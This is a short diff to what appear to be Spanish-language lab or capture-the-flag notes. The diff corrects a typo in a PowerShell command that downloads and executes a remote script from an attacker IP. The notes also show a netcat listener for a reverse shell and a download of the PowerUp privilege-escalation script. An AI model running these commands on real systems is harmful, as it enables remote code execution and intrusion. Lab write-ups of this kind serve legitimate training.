@@ -23,7 +23,7 @@ Nos ponemos a la escucha por otro puerto(el configurado al final en el archivto 
 nc -vlnp 444
 
 # Paso 6 peticion PS
-$ start /b C:\\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).donwladString('http://10.10.15.123/PST.ps1')
+$ start /b C:\\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.15.123/PST.ps1')
 
 # Invocar el Power-up.ps1 para enumeracion del sistema
 $ Invoke-WebRequest http://10.10.15.123:8000/PowerUp-ps1 -o PowerUp.ps1
